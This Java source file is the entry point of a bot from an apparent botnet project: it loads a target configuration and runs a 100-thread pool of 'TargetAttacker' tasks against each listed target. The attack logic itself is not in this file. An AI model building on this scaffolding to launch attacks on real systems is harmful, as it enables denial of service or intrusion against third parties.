/**
 * The MIT License (MIT)
 *
 * Copyright (c) 2016 Giacomo Marciani, Michele Porretta
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package com.giammp.botnet;

import com.giammp.botnet.config.BotConfigurator;
import com.giammp.botnet.config.BotConfiguration;
import com.giammp.botnet.control.BotShutdown;
import com.giammp.botnet.control.TargetAttacker;
import com.giammp.botnet.model.Target;

import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes the bot entry-point.
 * @author Giacomo Marciani {@literal <gmarciani@ieee.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0.0
 */
public class BotMain {

  /**
   * The bot main method, executed when the program is launched.
   * @param args The command line arguments.
   */
  public static void main(String[] args) {

    final BotConfiguration config = BotConfigurator.loadConfiguration(args);

    registerShutdownHooks(new BotShutdown());

    attackTargets(config.getTargets());

  }

  /**
   * Schedules the attacks
   * @param targets The list of targets to attack.
   * @see Target
   */
  private static void attackTargets(List<Target> targets) {
    ExecutorService executor = Executors.newFixedThreadPool(100);

    for (Target tgt : targets) {
      Runnable attacker = new TargetAttacker(tgt);
      executor.execute(attacker);
    }

    executor.shutdown();

    try {
      executor.awaitTermination(60, TimeUnit.SECONDS);
    } catch (InterruptedException e) {
      e.printStackTrace();
    }
  }

  /**
   * Registers atexit runnables as JVM shutdown hooks.
   * @param hooks atexit runnables.
   * @see Runtime
   * @see Thread
   * @see Runnable
   */
  private static void registerShutdownHooks(Runnable ...hooks) {
    Runtime runtime = Runtime.getRuntime();
    for (Runnable hook : hooks) {
      runtime.addShutdownHook(new Thread(hook));
    }
  }
}
